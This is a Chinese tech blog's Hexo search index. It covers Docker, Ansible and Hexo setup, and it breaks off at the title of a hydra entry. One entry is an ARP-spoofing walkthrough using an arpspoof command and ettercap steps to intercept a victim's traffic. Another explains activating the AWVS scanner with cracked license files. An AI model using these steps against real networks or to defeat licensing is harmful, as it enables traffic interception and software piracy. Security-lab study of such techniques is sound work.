<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Dockerfile命令</title>
    <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="center">Dockerfile</th>
<th align="left">指令	说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">FROM</td>
<td align="left">指定基础镜像，用于后续的指令构建。</td>
</tr>
<tr>
<td align="center">MAINTAINER</td>
<td align="left">指定Dockerfile的作者&#x2F;维护者。（已弃用，推荐使用LABEL指令）</td>
</tr>
<tr>
<td align="center">LABEL</td>
<td align="left">添加镜像的元数据，使用键值对的形式。</td>
</tr>
<tr>
<td align="center">RUN</td>
<td align="left">在构建过程中在镜像中执行命令。</td>
</tr>
<tr>
<td align="center">CMD</td>
<td align="left">指定容器创建时的默认命令。（可以被覆盖）</td>
</tr>
<tr>
<td align="center">ENTRYPOINT</td>
<td align="left">设置容器创建时的主要命令。（不可被覆盖）</td>
</tr>
<tr>
<td align="center">EXPOSE</td>
<td align="left">声明容器运行时监听的特定网络端口。</td>
</tr>
<tr>
<td align="center">ENV</td>
<td align="left">在容器内部设置环境变量。</td>
</tr>
<tr>
<td align="center">ADD</td>
<td align="left">将文件、目录或远程URL复制到镜像中。</td>
</tr>
<tr>
<td align="center">COPY</td>
<td align="left">将文件或目录复制到镜像中。</td>
</tr>
<tr>
<td align="center">VOLUME</td>
<td align="left">为容器创建挂载点或声明卷。</td>
</tr>
<tr>
<td align="center">WORKDIR</td>
<td align="left">设置后续指令的工作目录。</td>
</tr>
<tr>
<td align="center">USER</td>
<td align="left">指定后续指令的用户上下文。</td>
</tr>
<tr>
<td align="center">ARG</td>
<td align="left">定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。</td>
</tr>
<tr>
<td align="center">ONBUILD</td>
<td align="left">当该镜像被用作另一个构建过程的基础时，添加触发器。</td>
</tr>
<tr>
<td align="center">STOPSIGNAL</td>
<td align="left">设置发送给容器以退出的系统调用信号。</td>
</tr>
<tr>
<td align="center">HEALTHCHECK</td>
<td align="left">定义周期性检查容器健康状态的命令。</td>
</tr>
<tr>
<td align="center">SHELL</td>
<td align="left">覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>ansible命令</title>
    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
<pre><code>yum install epel-release -y
</code></pre>
<p>安装 Ansible</p>
<pre><code>yum install ansible -y
</code></pre>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
<p>hosts.ini：</p>
<pre><code>[hostst_g]
此处填写ip
[hosts_g:vars]
ansible_ssh_user=root ##账号
ansible_ssh_pass=123456 ##密码
</code></pre>
<p>command.yml：</p>
<pre><code>- name: 在远程主机上执行任意命令 
    hosts: all
    gather_facts: no
    tasks:
        - name: 执行一个特定命令
            command: echo &quot;你好，世界！&quot;
            # 使用 command 模块执行简单命令，不支持管道和重定向
        - name: 列出目录中的文件
            command: ls /path/to/directory
            # 列出指定目录中的所有文件
        - name: 使用 shell 运行包含管道的命令
            shell: echo &quot;你好，世界！&quot; | grep 你好
            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
        - name: 使用 shell 特性运行命令
            shell: cat /etc/passwd | grep root
            # 通过管道过滤包含 &quot;root&quot; 的行
</code></pre>
<p>可使用shell：模拟终端上所有执行的命令。</p>
<p>使用命令</p>
<pre><code>ansible-playbook -i hosts.ini command.yml
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>arp欺骗</title>
    <url>/2024/08/01/arpspoof/</url>
    <content><![CDATA[<h2 id="使用arpspoof命令："><a href="#使用arpspoof命令：" class="headerlink" title="使用arpspoof命令："></a>使用arpspoof命令：</h2><pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
</code></pre>
<p>-i interface          指定要使用的接口。<br>-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>host               指定您希望抓取数据包的host（通常是本地网关）</p>
<h2 id="使用ettercap-G-蜘蛛工具"><a href="#使用ettercap-G-蜘蛛工具" class="headerlink" title="使用ettercap -G 蜘蛛工具"></a>使用ettercap -G 蜘蛛工具</h2><p>实例演示-arp欺骗</p>
<p>1.打开ettercap，选择你要使用的网卡，点击”对号”。<br><img src="/images/pasted-4.png" alt="upload successful"></p>
<p>2.点击”搜索”按钮，进行主机发现。<br><img src="/images/pasted-5.png" alt="upload successful"></p>
<p>3.点击”红色方框里面的按钮”，我们可以查看”host list”.<br><img src="/images/pasted-6.png" alt="upload successful"></p>
<p>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。<br><img src="/images/pasted-7.png" alt="upload successful"></p>
<p>5.点击”圆圈”，选择”arp poisoning spoofing”。<br><img src="/images/pasted-8.png" alt="upload successful"></p>
<p>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。<br><img src="/images/pasted-9.png" alt="upload successful"></p>
<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br><img src="/images/pasted-10.png" alt="upload successful"></p>
<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>实战演示</tag>
      </tags>
  </entry>
  <entry>
    <title>docker pull 镜像失败问题解决方法（镜像多）</title>
    <url>/2024/08/13/docker-pull-%E9%95%9C%E5%83%8F%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%88%E9%95%9C%E5%83%8F%E5%A4%9A%EF%BC%89/</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>1、下载无法开始、重试、超时，这个问题更换可用的docker镜像仓库即可。</p>
<p>2、经常下载到一半没办法进行，卡在小镜像等等中途无法下载的情况。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这次解决中发现docker分两个服务，docker.server和docker.socket，这次只停掉docker.server，然后使用参数让每次下载个数为1，即可解决。</p>
<h3 id="停止docker服务"><a href="#停止docker服务" class="headerlink" title="停止docker服务"></a>停止docker服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>

<h3 id="参数修改下载数"><a href="#参数修改下载数" class="headerlink" title="参数修改下载数"></a>参数修改下载数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dockerd --max-concurrent-downloads 1</span><br></pre></td></tr></table></figure>

<h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><p>运行后，不要按ctrl+c停止，因为停掉之后就等于docker停了，所以要在新的窗口中运行docker pull下载镜像，就能看到下载时一次只下载一个layer了</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 卸载</title>
    <url>/2024/08/13/docker-%E5%8D%B8%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">          docker-client \</span><br><span class="line">          docker-client-latest \</span><br><span class="line">          docker-common \</span><br><span class="line">          docker-latest \</span><br><span class="line">          docker-latest-logrotate \</span><br><span class="line">          docker-logrotate \</span><br><span class="line">          docker-selinux \</span><br><span class="line">          docker-engine-selinux \</span><br><span class="line">          docker-engine</span><br></pre></td></tr></table></figure>
<p>较旧的 Docker 版本称为 docker 或 docker-engine</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce \</span><br><span class="line">          docker-ce-cli \</span><br><span class="line">          containerd</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /etc/systemd/system/docker.service</span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line">rm -rf /var/<span class="keyword">run</span><span class="language-bash">/docker</span></span><br><span class="line">rm -rf /usr/local/docker</span><br><span class="line">rm -rf /etc/docker</span><br><span class="line">rm -rf /usr/bin/docker* /usr/bin/containerd* /usr/bin/runc /usr/bin/ctr</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 可用加速镜像2024.08.13</title>
    <url>/2024/08/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%902024-08-13/</url>
    <content><![CDATA[<h2 id="daemon-json"><a href="#daemon-json" class="headerlink" title="daemon.json"></a>daemon.json</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="line">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="line">        &quot;https://dockerhub.icu&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>源自：小锋学长生活大爆炸[xfxuezhagn.cn]<br>原文链接：<a href="https://blog.csdn.net/sxf1061700625/article/details/140895299">https://blog.csdn.net/sxf1061700625/article/details/140895299</a></p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 使用(mysql5.7为例)</title>
    <url>/2024/08/09/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><h4 id="配置加速地址"><a href="#配置加速地址" class="headerlink" title="配置加速地址"></a>配置加速地址</h4><p>国内停服风波后，拉取镜像出现失败的现象，可通过配置加速地址解决（卡顿也可使用此方法）</p>
<pre><code>sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;
&#123;
    &quot;registry-mirrors&quot;: [
        &quot;https://do.nark.eu.org&quot;,
        &quot;https://dc.j8.work&quot;,
        &quot;https://docker.m.daocloud.io&quot;,
        &quot;https://dockerproxy.com&quot;,
        &quot;https://docker.mirrors.ustc.edu.cn&quot;,
        &quot;https://docker.nju.edu.cn&quot;
    ]
&#125;
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
————————————————                   
原文链接：https://blog.csdn.net/weixin_50160384/article/details/139861337
</code></pre>
<p>配置完成后，经过测试能看到已经解决，可通过docker info检查上面配置是否生效。</p>
<h4 id="拉取镜像-1"><a href="#拉取镜像-1" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>使用docker pull</p>
<pre><code>docker pull mysql:5.7
</code></pre>
<p>拉取完成后，可查看拉取的日志</p>
<pre><code>docker history mysql:5.7
</code></pre>
<h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h4 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h4><p>mysql:5.7需要挂载目录，所以要使用-v挂载，5.7目录为&#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;，要注意其他版本目录位置。</p>
<pre><code>docker run \
--name mysql \
-d \
-p 3306:3306 \
--restart unless-stopped \
-v ./mysql/log:/var/log/mysql \
-v ./mysql/data:/var/lib/mysql \
-v ./mysql/conf:/etc/mysql/conf.d/ \
-e MYSQL_ROOT_PASSWORD=123456 \
mysql:5.7
</code></pre>
<p>如果启动失败可通过命令查看日志，大概率是目录的问题</p>
<pre><code>docker logs mysql:5.7
</code></pre>
<h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><p>查看容器信息</p>
<pre><code>docker ps
</code></pre>
<p>容器id为第一列<br><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>通过id操作容器</p>
<p>停止容器运行</p>
<pre><code>docker stop 0c36
</code></pre>
<p>启动停止的容器</p>
<pre><code>docker start 0c36
</code></pre>
<p>删除停止的容器</p>
<pre><code>docker rm 0c36
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS Docker 安装</title>
    <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="自动安装docker"><a href="#自动安装docker" class="headerlink" title="自动安装docker"></a>自动安装docker</h2><p>使用官方安装脚本自动安装：</p>
<pre><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
</code></pre>
<p>国内安装命令：</p>
<pre><code>curl -sSL https://get.daocloud.io/docker | sh
</code></pre>
<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
<pre><code>yum remove docker \
      docker-client \
      docker-client-latest \
      docker-common \
      docker-latest \
      docker-latest-logrotate \
      docker-logrotate \
      docker-engine
      
</code></pre>
<h2 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h2><p>Docker Engine-Community：这是 Docker Engine 的开源社区版本，也是最常用的版本。Docker Engine 是 Docker 的核心组件，负责运行容器。Docker Engine-Community 是由 Docker, Inc. 提供的免费版本，适合个人开发者和小团队使用。</p>
<h4 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h4><p>yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p>
<pre><code>yum install -y yum-utils
</code></pre>
<p>设置仓库</p>
<pre><code>官方源地址（比较慢）
sudo yum-config-manager \
--add-repo \
https://download.docker.com/linux/centos/docker-ce.repo

阿里云
sudo yum-config-manager \
--add-repo \
https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
</code></pre>
<h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>最新版本安装</p>
<pre><code>yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin
</code></pre>
<p>查看版本</p>
<pre><code>yum list docker-ce --showduplicates | sort -r
</code></pre>
<p>指定版本安装（仅需修改26.1.1）</p>
<pre><code>yum install docker-ce-26.1.1 docker-ce-cli-26.1.1.1 containerd.io
</code></pre>
<h2 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h2><p>删除安装包：</p>
<pre><code>yum remove docker-ce
</code></pre>
<p>删除镜像、容器、配置文件等内容：</p>
<pre><code>rm -rf /var/lib/docker
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装awvs并激活</title>
    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
<pre><code>docker search awvs
</code></pre>
<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
<p>选择secfa&#x2F;awvs的镜像</p>
<pre><code>docker pull secfa/awvs
docker images -a
</code></pre>
<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
</code></pre>
<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
</code></pre>
<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
<pre><code>awvs username: admin@admin.com
awvs password: Admin123
</code></pre>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
<pre><code>license_info.json
wa_data.dat
</code></pre>
<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
<pre><code>/home/acunetix/.acunetix/data/license
</code></pre>
<p>文件传输进入容器命令为：</p>
<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
</code></pre>
<p>重启容器</p>
<pre><code>docker restart 容器id
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>awvs安装</tag>
        <tag>awvs</tag>
      </tags>
  </entry>
  <entry>
    <title>docker目录挂载</title>
    <url>/2024/08/11/docker%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker目录的挂载有三种方式，分别试用于不同的场景：<br>1、Bind Mount将宿主机上的一个文件或目录挂载到容器内。<br>    适用于修改配置文件或者代码文件的目录，容器会和宿主机同步更新。</p>
<p>2、Volume由Docker创建和管理的目录，用于持久化和共享数据，与上述类似，区别在于是使用一个新的，由容器创建的目录</p>
<p>3、tmpfs mount 存储临时文件，存储于主机内存中，不能多容器共享（使用场景少）</p>
<h2 id="Bind-Mount"><a href="#Bind-Mount" class="headerlink" title="Bind Mount"></a>Bind Mount</h2><p>常用命令</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;绝对路径&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<p>使用 –mount 指令进行绑定挂载</p>
<pre><code>docker run -d --name &lt;容器名&gt; --mount type=bind,source=&lt;宿主机目录&gt;,target=&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
<h2 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h2><p>常用命令&lt;数据卷名称&gt;直接写名字则是在当前目录创建目录</p>
<pre><code>docker run -d --name &lt;容器名&gt; -v &lt;数据卷名称&gt;:&lt;容器目录&gt; &lt;镜像&gt;
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>github部署hexo</title>
    <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
    <content><![CDATA[<h2 id="本地ssh连接-GitHub"><a href="#本地ssh连接-GitHub" class="headerlink" title="本地ssh连接 GitHub"></a>本地ssh连接 GitHub</h2><h4 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h4><p>确保下载了git后输入命令</p>
<pre><code>git config --global user.name &quot;你的 GitHub 用户名&quot;
git config --global user.email &quot;你的 GitHub 邮箱&quot;
</code></pre>
<p>创建 SSH 密匙（可以-f指定输出目录）</p>
<pre><code>ssh-keygen -t rsa -C &quot;你的 GitHub 邮箱&quot;
</code></pre>
<p>什么都不用管，一路回车就行，创建好之后可以在.ssh看到有id_rsa.pub(.pub是公钥，id_rsa是私钥)。<br>打开 id_rsa.pub 并复制里面的内容。</p>
<h4 id="在-GitHub-中添加-SSH-密钥"><a href="#在-GitHub-中添加-SSH-密钥" class="headerlink" title="在 GitHub 中添加 SSH 密钥"></a>在 GitHub 中添加 SSH 密钥</h4><p>回到 GitHub，进入 Settings：<br><img src="/images/pasted-11.png" alt="upload successful"></p>
<p>选择左边栏的 SSH and GPG keys，点击 New SSH key：<br><img src="/images/pasted-12.png" alt="upload successful"></p>
<p>Title 随便取，然后把 id_rsa.pub 里面的内容到复制到 Key 中，点击 Add SSH key：<br><img src="/images/pasted-13.png" alt="upload successful"></p>
<p>保存完毕本地验证一下连接</p>
<pre><code>ssh -T git@github.com
</code></pre>
<p>出现 “Are you sure……”，输入 yes 回车确认，若出现下图的提示即连接成功：<br><img src="/images/pasted-14.png" alt="upload successful"></p>
<h2 id="创建-GitHub-仓库"><a href="#创建-GitHub-仓库" class="headerlink" title="创建 GitHub 仓库"></a>创建 GitHub 仓库</h2><p>GitHub 的主页 repository 中点击右上角的 New：<br><img src="/images/pasted-15.png" alt="upload successful"></p>
<p>填写基本信息:<br>Repository name 中输入用户名.github.io，一定要是这个名字！<br>勾选 Add a README file<br><img src="/images/pasted-16.png" alt="upload successful"></p>
<p>填好后点击 Create repository 创建仓库</p>
<h2 id="上传-hexo-程序到-GitHub"><a href="#上传-hexo-程序到-GitHub" class="headerlink" title="上传 hexo 程序到 GitHub"></a>上传 hexo 程序到 GitHub</h2><p>需要先安装 hexo-deployer-git：</p>
<pre><code>npm install hexo-deployer-git --save
</code></pre>
<p>修改_config.yml 文件末尾的 Deployment 部分：<br><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>修改成如下（修改为你的用户名与仓库名）<br><img src="/images/pasted-18.png" alt="upload successful"></p>
<pre><code>deploy:
  type: git
  repo: git@github.com:w00123/w00123.github.io.git
  branch: gh-pages
</code></pre>
<p>修改完成保存后运行</p>
<pre><code>hexo c
hexo d
</code></pre>
<p>出现下面的提示说明已经把网站上传到 GitHub 了：<br><img src="/images/pasted-19.png" alt="upload successful"></p>
<p>然后我们需要在库设置（Repository Settings）中将默认分支设置为_config.yml 配置中的分支名称。<br><img src="/images/pasted-20.png" alt="upload successful"></p>
<p>然后在 pages 页面调整源分支：<br><img src="/images/pasted-21.png" alt="upload successful"></p>
<p>访问用户名.github.io就可以看到默认 hexo 了。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/07/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo一图流方法</title>
    <url>/2024/08/03/hexo%E4%B8%80%E5%9B%BE%E6%B5%81%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h4 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h4><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>通过开启butterfly主题留下的inject模块功能</p>
<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
<pre><code>cd /themes/butterfly/source/css/
</code></pre>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>编辑让顶部背景和页脚背景透明的css文件</p>
<pre><code>vim custom.css
#footer &#123;
background: transparent !important;
&#125;
#page-header &#123;
    background: transparent !important;
&#125;

#footer::before&#123;
    background: transparent !important;
&#125;
#page-header::before&#123;
    background: transparent !important;
&#125;

[data-theme＝&quot;dark&quot;] #footer::before&#123;
    background: transparent !important;
&#125;
[data-theme＝&quot;dark&quot;] #page-header::before&#123;
    background: transparent !important;
&#125;
</code></pre>
<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
<pre><code>vim /hexo/themes/butterfly/_config.yml
</code></pre>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<h2 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h2><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><pre><code>hexo clean ; hexo s
</code></pre>
<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客安装方法</title>
    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h2><p>pkg换源<br>sed -i ‘s@^(deb.*stable main)$@#\1\ndeb <a href="https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24">https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24</a> stable main@’ $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</p>
<p>pkg update</p>
<p>pkg install nodejs-lts<br>pkg install git<br>pkg install vim</p>
<p>需要在目录下运行安装<br>mkdir hexo<br>chmod 777 hexo<br>cd hexo</p>
<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>npm install hexo-cli -g<br>hexo init</p>
<p>启动命令<br>hexo g<br>hexo s</p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly</p>
<p>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
<p>vim编辑根目录下_config.yml中的theme：butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p>
<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra命令</title>
    <url>/2024/08/01/hydra%E5%91%BD%E4%BB%A4/</url>
